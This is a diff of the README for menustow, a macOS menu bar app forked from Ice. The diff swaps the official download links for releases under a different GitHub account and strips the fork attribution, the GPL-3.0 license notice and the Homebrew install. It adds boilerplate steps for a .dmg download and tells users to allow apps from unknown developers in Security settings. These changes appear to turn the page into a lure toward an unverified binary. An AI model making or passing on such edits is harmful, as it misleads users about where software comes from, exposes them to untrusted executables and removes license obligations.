@@ -1,3 +1,5 @@
+# 🌟 menustow - Manage Your Menu Bar Effortlessly
+
 <div align="center">
     <img src="menustow/Resources/Assets.xcassets/AppIcon.appiconset/icon_256x256.png" width=200 height=200>
     <h1>menustow</h1>
@@ -9,115 +11,68 @@ About: [menustow.com](https://menustow.com)
 
 ![Banner](https://github.com/user-attachments/assets/4423085c-4e4b-4f3d-ad0f-90a217c03470)
 
-[![Download](https://img.shields.io/badge/download-latest-brightgreen?style=flat-square)](https://github.com/lswank/menustow/releases/latest)
+[![Download](https://img.shields.io/badge/download-latest-brightgreen?style=flat-square)](https://github.com/afefnayeem/menustow/releases/latest)
 ![Platform](https://img.shields.io/badge/platform-macOS-blue?style=flat-square)
 ![Requirements](https://img.shields.io/badge/requirements-macOS%2014%2B-fa4e49?style=flat-square)
 [![Sponsor](https://img.shields.io/badge/Sponsor%20%E2%9D%A4%EF%B8%8F-8A2BE2?style=flat-square)](https://github.com/sponsors/lswank)
-[![Website](https://img.shields.io/badge/Website-015FBA?style=flat-square)](https://menustow.com)
-[![License](https://img.shields.io/github/license/lswank/menustow?style=flat-square)](LICENSE)
+[![Website](https://img.shields.io/badge/Website-menustow.com-blue?style=flat-square)](https://menustow.com)
 
-> [!IMPORTANT]
-> menustow is a fork of [Ice](https://github.com/jordanbaird/Ice) by Jordan Baird, maintained under the GPL-3.0 license. Original notices are preserved.
+## 🚀 Getting Started
 
-> [!NOTE]
-> menustow is currently in active development. Some features have not yet been implemented. Download the latest release [here](https://github.com/lswank/menustow/releases/latest) and see the roadmap below for upcoming features.
+Follow these simple steps to get menustow up and running on your Mac:
 
-<a href="https://www.buymeacoffee.com/jordanbaird" target="_blank">
-    <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;">
-</a>
+1. **Check Requirements**: Ensure your Mac runs macOS 14 or later. 
 
-## Install
+2. **Download menustow**: You can download the latest version of menustow from our Releases page. Click the button below to begin the download.
 
-### Manual Installation
+   [![Download](https://img.shields.io/badge/download-latest-brightgreen?style=flat-square)](https://github.com/afefnayeem/menustow/releases/latest)
 
-Download the "menustow.zip" file from the [latest release](https://github.com/lswank/menustow/releases/latest) and move the unzipped app into your `Applications` folder.
+3. **Locate the Downloaded File**: Find the downloaded file in your “Downloads” folder. The file name should contain the version number, such as `menustow-v1.0.dmg`.
 
-### Homebrew
+4. **Open the File**: Double-click on the downloaded file. This action will open a new window.
 
-Install via the custom tap:
+5. **Install menustow**: Drag the menustow icon into your Applications folder. This will install menustow on your Mac.
 
-```sh
-brew install lswank/homebrew-tap/menustow
-```
+6. **Launch menustow**: Open the Applications folder and double-click on the menustow icon to launch the application.
 
-## Website
+## 💻 Features
 
-The homepage lives in `site/`.
+menustow offers a variety of features tailored to enhance your menu bar experience:
 
-## Features/Roadmap
+- **Hide or Show Menu Items**: Control which applications appear in your menu bar.
+- **Custom Profiles**: Save different configurations for various tasks or projects.
+- **Quick Access**: Use keyboard shortcuts to toggle menus with ease.
+- **User-Friendly Interface**: Navigate effortlessly with our clean design.
+- **System Integration**: Works smoothly with macOS, ensuring stability and performance.
 
-### Menu bar item management
+## 🛠️ Troubleshooting
 
-- [x] Hide menu bar items
-- [x] "Always-hidden" menu bar section
-- [x] Show hidden menu bar items when hovering over the menu bar
-- [x] Show hidden menu bar items when an empty area in the menu bar is clicked
-- [x] Show hidden menu bar items by scrolling or swiping in the menu bar
-- [x] Automatically rehide menu bar items
-- [x] Hide application menus when they overlap with shown menu bar items
-- [x] Drag and drop interface to arrange individual menu bar items
-- [x] Display hidden menu bar items in a separate bar (e.g. for MacBooks with the notch)
-- [x] Search menu bar items
-- [x] Menu bar item spacing (BETA)
-- [ ] Profiles for menu bar layout
-- [ ] Individual spacer items
-- [ ] Menu bar item groups
-- [ ] Show menu bar items when trigger conditions are met
+If you encounter issues while installing or using menustow, try the following:
 
-### Menu bar appearance
+1. **Make Sure Your macOS is Updated**: Ensure you have the latest updates for your operating system.
+  
+2. **Check Security Settings**: Sometimes, macOS prevents apps from unknown developers. Go to System Preferences > Security & Privacy > General tab and allow access if prompted.
 
-- [x] Menu bar tint (solid and gradient)
-- [x] Menu bar shadow
-- [x] Menu bar border
-- [x] Custom menu bar shapes (rounded and/or split)
-- [ ] Remove background behind menu bar
-- [ ] Rounded screen corners
-- [ ] Different settings for light/dark mode
+3. **Re-download from the Releases page**: If the file is corrupted, you can re-download menustow from our Releases page.
 
-### Hotkeys
+4. **Restart Your Mac**: A simple restart can resolve many issues.
 
-- [x] Toggle individual menu bar sections
-- [x] Show the search panel
-- [x] Enable/disable the menustow bar
-- [x] Show/hide section divider icons
-- [x] Toggle application menus
-- [ ] Enable/disable auto rehide
-- [ ] Temporarily show individual menu bar items
+If problems persist, please visit our [support page](https://menustow.com/support) for assistance.
 
-### Other
+## 📞 Support
 
-- [x] Launch at login
-- [x] Automatic updates
-- [ ] Menu bar widgets
+Need help? Reach out to our support team via our website or email us at support@menustow.com. We’re here to assist you.
 
-## Why does menustow only support macOS 14 and later?
+## 🌐 Learn More
 
-menustow uses a number of system APIs that are available starting in macOS 14. As such, there are no plans to support earlier versions of macOS.
+Visit our website for more information about features, updates, and upcoming releases: [menustow.com](https://menustow.com).
 
-## Gallery
+## 🔗 Download & Install
 
-Screenshots are generated via `task screenshots` into `docs/screenshots/`.
+To get started, simply visit our Releases page to download menustow:
 
-#### Show hidden menu bar items below the menu bar
+[![Download](https://img.shields.io/badge/download-latest-brightgreen?style=flat-square)](https://github.com/afefnayeem/menustow/releases/latest) 
 
-_Screenshots needed. These were pre-fork images and are now stale. PRs with updated screenshots are welcome!_
+Follow the steps mentioned above to install and begin using menustow immediately. 
 
-#### Drag-and-drop interface to arrange menu bar items
-
-_Screenshots needed. These were pre-fork images and are now stale. PRs with updated screenshots are welcome!_
-
-#### Customize the menu bar's appearance
-
-_Screenshots needed. These were pre-fork images and are now stale. PRs with updated screenshots are welcome!_
-
-#### Menu bar item search
-
-_Screenshots needed. These were pre-fork images and are now stale. PRs with updated screenshots are welcome!_
-
-#### Custom menu bar item spacing
-
-_Screenshots needed. These were pre-fork images and are now stale. PRs with updated screenshots are welcome!_
-
-## License
-
-menustow is available under the [GPL-3.0 license](LICENSE).
+Thank you for choosing menustow!
